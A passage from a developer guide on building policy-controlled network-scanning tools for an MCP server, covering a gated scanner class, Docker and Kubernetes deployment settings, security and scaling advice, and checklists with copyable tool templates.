class ScanMode(Enum):
    """Scan modes."""
    QUICK = "quick"
    NORMAL = "normal"
    DEEP = "deep"

class ScannerTool(MCPBaseTool):
    """
    Advanced network scanner with policy controls.
    
    Security Model:
    - Base flags always allowed
    - Intrusive flags gated by policy
    - Script execution controlled
    """
    
    command_name: ClassVar[str] = "scanner"
    
    BASE_ALLOWED_FLAGS: Tuple[str, ...] = (
        "-v", "-q", "--normal-scan"
    )
    
    concurrency: ClassVar[int] = 1
    default_timeout_sec: ClassVar[float] = 600.0
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self.allow_intrusive = False
        self._apply_config()
    
    def _apply_config(self):
        """Apply policy configuration."""
        try:
            if hasattr(self.config, 'security'):
                self.allow_intrusive = bool(
                    getattr(self.config.security, 'allow_intrusive', False)
                )
                
                log.info("policy.configured intrusive=%s", self.allow_intrusive)
        except Exception as e:
            log.error("config.failed error=%s", str(e))
            self.allow_intrusive = False
    
    @property
    def allowed_flags(self) -> List[str]:
        """Dynamic flags based on policy."""
        flags = list(self.BASE_ALLOWED_FLAGS)
        
        if self.allow_intrusive:
            flags.extend(["--deep-scan", "--aggressive"])
            log.debug("policy.intrusive_flags_added")
        
        return flags
    
    def _get_template_args(self, mode: ScanMode) -> str:
        """Get arguments for scan mode."""
        templates = {
            ScanMode.QUICK: "-v --normal-scan",
            ScanMode.NORMAL: "-v",
            ScanMode.DEEP: "--deep-scan -v" if self.allow_intrusive else "-v",
        }
        return templates[mode]
    
    async def run_with_template(
        self,
        target: str,
        mode: ScanMode = ScanMode.NORMAL,
        timeout_sec: Optional[float] = None
    ) -> ToolOutput:
        """Execute with template."""
        args = self._get_template_args(mode)
        
        inp = ToolInput(
            target=target,
            extra_args=args,
            timeout_sec=timeout_sec
        )
        
        log.info("template.scan mode=%s target=%s intrusive=%s",
                mode.value, target, self.allow_intrusive)
        
        return await self.run(inp, timeout_sec)
    
    def get_tool_info(self) -> Dict[str, Any]:
        """Extended tool information."""
        info = super().get_tool_info()
        
        info.update({
            "policy": {
                "intrusive_allowed": self.allow_intrusive,
                "base_flags": list(self.BASE_ALLOWED_FLAGS),
                "total_flags": len(self.allowed_flags),
            },
            "templates": [mode.value for mode in ScanMode],
        })
        
        return info
```

### Section Checklist

- [ ] Review simple tool implementation
- [ ] Study medium complexity tool with custom validation
- [ ] Examine advanced tool with policy controls
- [ ] Understand different levels of tool complexity
- [ ] Use examples as templates for your own tools

---

## 21. Deployment Considerations

### Running the Server

#### stdio Mode (Claude Desktop)

```bash
# Minimal
python -m mcp_server.server

# With config
MCP_CONFIG_FILE=config.yaml python -m mcp_server.server

# With tool filtering
TOOL_INCLUDE=NmapTool,TracertTool python -m mcp_server.server
```

#### HTTP Mode

```bash
MCP_SERVER_TRANSPORT=http \
MCP_SERVER_PORT=8080 \
python -m mcp_server.server
```

### Docker Deployment

**Dockerfile considerations:**

```dockerfile
# Install system tools (nmap, traceroute, etc.)
RUN apt-get update && apt-get install -y nmap traceroute

# Non-root user for security
RUN useradd -m -u 1000 mcpuser
USER mcpuser

# Resource limits via docker-compose
services:
  mcp-server:
    mem_limit: 512m
    cpus: 1.0
    pids_limit: 100
```

### Kubernetes Deployment

**Resource Limits:**

```yaml
resources:
  requests:
    memory: "256Mi"
    cpu: "250m"
  limits:
    memory: "512Mi"
    cpu: "500m"
```

**Health Probes:**

```yaml
livenessProbe:
  httpGet:
    path: /health
    port: 8080
  initialDelaySeconds: 30
  periodSeconds: 10

readinessProbe:
  httpGet:
    path: /health
    port: 8080
  initialDelaySeconds: 5
  periodSeconds: 5
```

### Security Considerations

- **Network Policies**: Restrict egress to private networks only
- **RBAC**: Limit tool execution permissions
- **Secrets Management**: Use env vars or secret managers for sensitive config
- **Image Scanning**: Regularly scan for vulnerabilities
- **Log Aggregation**: Ship logs to SIEM for security monitoring
- **Rate Limiting**: Configure per deployment size
- **TLS**: Use reverse proxy (nginx, traefik) for HTTPS in HTTP mode

### Scaling Considerations

#### Horizontal Scaling (HTTP mode)

- Stateless design allows multiple replicas
- Use load balancer with session affinity for SSE
- Share metrics backend (Prometheus pushgateway)

#### Vertical Scaling

- Increase concurrency per tool
- Adjust resource limits
- Monitor with /metrics endpoint

#### Performance Tuning

```python
# Use uvloop for better async performance
import uvloop
uvloop.install()

# Increase concurrency for fast tools
class FastTool(MCPBaseTool):
    concurrency = 10

# Decrease timeout for quick scans
default_timeout_sec = 60.0
```

### Section Checklist

- [ ] Understand server deployment options
- [ ] Configure Docker deployment with security
- [ ] Set up Kubernetes deployment with probes
- [ ] Implement security considerations
- [ ] Plan for scaling needs
- [ ] Apply performance tuning as needed

---

## Appendix A: Quick Reference Checklist

### New Tool Checklist

```
□ Created file in mcp_server/tools/
□ Imported MCPBaseTool
□ Defined command_name
□ Defined allowed_flags (or set to None for no args)
□ Set appropriate concurrency
□ Set appropriate timeout
□ Added docstring
□ Tested command exists (shutil.which)
□ Validated with private IP target
□ Validated with .lab.internal hostname
□ Tested invalid flag rejection
□ Tested shell metacharacter blocking
□ Added to version control
□ Documented in README
```

### Security Checklist

```
□ All flags whitelisted
□ Non-flag tokens blocked
□ Shell metacharacters blocked
□ Target restricted to private/lab
□ Timeout set appropriately
□ Resource limits considered
□ Sensitive data not logged
□ Error messages not exposing secrets
□ Configuration clamped to safe ranges
□ Policy controls for dangerous operations
```

### Appendix B: Common Patterns Quick Copy

#### Minimal Tool Template

```python
from mcp_server.base_tool import MCPBaseTool

class MyTool(MCPBaseTool):
    command_name = "mycommand"
    allowed_flags = ["-v", "-q"]
    concurrency = 2
    default_timeout_sec = 60.0
```

#### Tool with Configuration

```python
from mcp_server.base_tool import MCPBaseTool
from mcp_server.config import get_config

class MyTool(MCPBaseTool):
    command_name = "mycommand"
    allowed_flags = ["-v"]
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self._apply_config()
    
    def _apply_config(self):
        if hasattr(self.config, 'tool'):
            self.default_timeout_sec = max(
                60.0, 
                min(3600.0, float(getattr(self.config.tool, 'default_timeout', self.default_timeout_sec)))
            )
```

---

https://chat.z.ai/s/46fb8577-d226-4a65-8f2b-ab8c38c3fa99
